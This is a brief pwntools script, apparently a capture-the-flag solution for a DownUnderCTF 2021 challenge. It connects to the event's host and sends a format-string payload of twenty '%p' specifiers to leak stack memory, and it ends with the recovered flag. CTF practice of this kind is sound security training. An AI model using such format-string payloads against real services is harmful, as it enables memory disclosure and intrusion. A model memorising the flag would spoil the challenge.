from pwn import *
h,p = 'pwn-2021.duc.tf', 31918
#p = process('hellothere')
p = remote(h,p)
exp = "%p"*20

p.sendline(exp)
p.interactive()
DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
